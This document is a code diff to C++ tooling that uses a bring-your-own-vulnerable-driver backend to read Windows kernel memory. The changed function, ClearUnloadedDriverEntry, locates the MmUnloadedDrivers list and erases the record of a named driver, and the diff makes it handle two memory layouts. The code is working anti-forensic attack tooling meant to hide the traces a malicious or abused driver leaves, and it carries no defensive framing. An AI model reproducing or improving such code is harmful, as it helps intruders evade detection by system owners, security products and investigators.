@@ -167,8 +167,8 @@ static bool NamesMatch(byovd::IByovdBackend* backend, uint64_t unicodeStringVa, 
 // ---------------------------------------------------------------------------
 
 bool ClearUnloadedDriverEntry(byovd::IByovdBackend* backend, const std::wstring& driverName) {
-    uint64_t arrayVa = FindMmUnloadedDrivers(backend);
-    if (!arrayVa) {
+    uint64_t globalVa = FindMmUnloadedDrivers(backend);
+    if (!globalVa) {
         std::wcerr << L"[hinv::cleaner] MmUnloadedDrivers not located\n";
         return false;
     }
@@ -176,12 +176,24 @@ bool ClearUnloadedDriverEntry(byovd::IByovdBackend* backend, const std::wstring&
     constexpr size_t ARRAY_SIZE = 50;
     bool found = false;
 
-    // First try: array of pointers to UNLOADED_DRIVER_ENTRY (common layout).
+    // Determine whether the global is an array of pointers or a pointer to an array.
+    uint64_t firstEntry = 0;
+    uint64_t arrayVa = globalVa;
+    if (backend->ReadKernelMemory(globalVa, &firstEntry, sizeof(firstEntry)) &&
+        firstEntry >= 0xFFFF000000000000ULL) {
+        // Try dereferencing as pointer-to-array.
+        uint64_t probe = 0;
+        if (backend->ReadKernelMemory(firstEntry, &probe, sizeof(probe)) &&
+            probe >= 0xFFFF000000000000ULL) {
+            arrayVa = firstEntry;
+        }
+    }
+
+    // Array of pointers layout (most common).
     std::vector<uint64_t> pointers(ARRAY_SIZE, 0);
     if (backend->ReadKernelMemory(arrayVa, pointers.data(), pointers.size() * sizeof(uint64_t))) {
         for (size_t i = 0; i < ARRAY_SIZE; ++i) {
             if (!pointers[i]) continue;
-            // Heuristic: valid kernel pointer should be in high address space.
             if (pointers[i] < 0xFFFF000000000000ULL) continue;
 
             if (NamesMatch(backend, pointers[i], driverName)) {
@@ -196,7 +208,7 @@ bool ClearUnloadedDriverEntry(byovd::IByovdBackend* backend, const std::wstring&
         }
     }
 
-    // Fallback: array of records directly (some builds use this layout).
+    // Record-array fallback (less common).
     if (!found) {
         UNLOADED_DRIVER_ENTRY entries[ARRAY_SIZE]{};
         if (backend->ReadKernelMemory(arrayVa, entries, sizeof(entries))) {
